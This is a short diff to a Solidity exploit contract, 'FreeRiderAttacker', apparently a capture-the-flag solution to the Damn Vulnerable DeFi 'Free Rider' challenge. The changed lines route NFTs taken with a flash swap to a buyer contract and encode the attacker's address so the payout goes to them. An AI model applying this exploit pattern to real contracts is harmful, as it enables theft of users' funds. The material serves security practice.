@@ -88,9 +88,16 @@ contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
         //6. Not that we have WETH - payback flashwap with fee
         WETH.transfer(address(UNISWAP_PAIR), _repayAmount);
 
+        bytes memory _data = abi.encode(attacker);
+
         //7. Send NFT's to buyer to get payout (45 ETH)
         for (uint256 i = 0; i < 6; i++) {
-            NFT.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
+            NFT.safeTransferFrom(
+                address(this),
+                address(buyer),
+                tokenIds[i],
+                _data
+            );
         }
 
         //8. Transfer ETH (payout) to attacker
